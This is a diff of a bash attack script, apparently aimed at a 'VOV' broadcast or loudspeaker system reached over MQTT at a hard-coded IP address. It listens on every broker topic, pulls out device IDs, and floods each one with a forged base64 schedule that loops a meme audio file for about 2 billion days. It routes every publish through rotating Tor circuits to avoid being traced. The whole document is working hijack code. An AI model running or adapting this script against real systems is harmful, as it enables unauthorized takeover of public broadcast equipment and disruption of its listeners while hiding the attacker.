@@ -1,28 +1,32 @@
 #!/bin/bash
-# HIJACK_ALL_VOV.sh - Auto-capture live topics + Peppe overwrite (Torsocks rotation)
+# HIJACK_ALL_VOV_FIXED.sh - Peppe Brescia Poeta LOOP
 
-HOST="42.1.64.56"
-PORT=1883
-PEPPe_URL="https://www.myinstants.com/media/sounds/peppe-brescia-poeta.mp3"
-PAYLOAD='[{"id":51886,"show_id":51886,"show_info":"eyJtaWQiOjUxODg2LCJwcmlvIjo5OTk5LCJzdW1tYXJ5IjoiUEVQUEUgQlJFU0NJQSBQT0VUWSAyNEg3IiwibW9kZSI6MSwicmVwZWF0IjoxLCJkYXlzIjoxMjcsImZpbGVzIjpbeyJpZCI6MCwidHlwZSI6MywidXJsIjoiaHR0cHM6Ly90dHRtLm1vYmlmb25lLnZuL3VwbG9hZEZpbGUvaGVhZGVyL2hlYWRlci53YXYifSx7ImlkIjo1MTg4NiwidHlwZSI6MSwic2l6ZSI6MzAwMDAsImR1cmF0aW9uIjozMCwidXJsIjoi'"$PEPPe_URL"'In19","action":1,"version":51886}]'
+PEPPER_URL="https://www.myinstants.com/media/sounds/peppe-brescia-poeta.mp3"
+PEPPER_PAYLOAD='[
+  {
+    "id":51886,
+    "show_id":51886,
+    "show_info":"eyJtaWQiOjUxODg2LCJ2ZXJzaW9uIjoxLCJwcmlvIjo5OTksInN1bW1hcnkiOiJQZXBwZSBicmVzY2lhIHBvZXRhIEhJSkFDSy1WT1YzIiwibW9kZSI6MSwicmVwZWF0IjoxLCJkYXlzIjoyMTQ3NDgzNjMyLCJ0cyI6WzE3MjgwMF0sImRzIjpbMTcyODAsMTcyODBdLCJjcmVhdGVkIjoxNzY3NjM1MDAwLCJzdGFydCI6MTc2NzYzMjQwMCwiZXhwaXJlZCI6MTc2OTg3ODc5OSwiZmlsZXMiOlt7ImlkIjo1MTg4NiwiaW5kZXgiOjAsInR5cGUiOjEsInNpemUiOjEyMzQ1Niwic3MiOjEyMzQ1NiwidXJsIjoiaHR0cHM6Ly93d3cubXlpbnN0YW50cy5jb20vbWVkaWEvc291bmRzL3BlcHBlLWJyZXNjaWEtcG9ldGEubXAzIn1dfQ==",
+    "action":1,
+    "description":"Peppe Brescia Poeta LOOP",
+    "version":1,
+    "created_at":"2026-01-06T01:00:00.000000000+07:00"
+  }
+]'
 
-# Torsocks rotation
-rotate_torsocks() {
-  CIRCUIT=$((RANDOM % 10 + 1))
-  torsocks -C $CIRCUIT mosquitto_pub -h $HOST -p $PORT -t "$1" -m "$PAYLOAD" >/dev/null 2>&1
-}
+echo "=== PEppe Brescia Poeta VOV HIJACK LIVE START ==="
+echo "URL: $PEPPER_URL"
+echo "LOOP: YES (repeat:1, days:2147483632)"
+echo "Monitor: torsocks mosquitto_sub -t '#' | grep 51886"
 
-echo "🔥 LIVE HIJACK START - Ctrl+C to stop"
-torsocks mosquitto_sub -h $HOST -p $PORT -t '#' | while read line; do
-  # Estrai topic da messaggio MQTT (es. 88171961791382520:d:16)
-  topic=$(echo "$line" | grep -o '[0-9]\{17\}:[sd]:[0-9]\+' | head -1)
-  if [[ $topic ]]; then
-    echo "ID=$topic HIJACKED"
-    # Triple overwrite con rotation
-    rotate_torsocks "$topic"
-    sleep 0.1
-    rotate_torsocks "$topic"
-    sleep 0.1
-    rotate_torsocks "$topic"
+while read -r line; do
+  if [[ $line =~ \"n\":\"([0-9]{17}):[sd]:[0-9]+\" ]]; then
+    TOPIC="${BASH_REMATCH[1]}:d:16"
+    echo "ID=$TOPIC HIJACKED → Peppe Brescia Poeta"
+    
+    for i in {1..3}; do
+      CIRCUIT=$((RANDOM%10+1))
+      torsocks -C $CIRCUIT mosquitto_pub -h 42.1.64.56 -p 1883 -t "$TOPIC" -m "$PEPPER_PAYLOAD" &
+    done
   fi
-done
+done < <(torsocks mosquitto_sub -h 42.1.64.56 -p 1883 -t '#' 2>/dev/null)
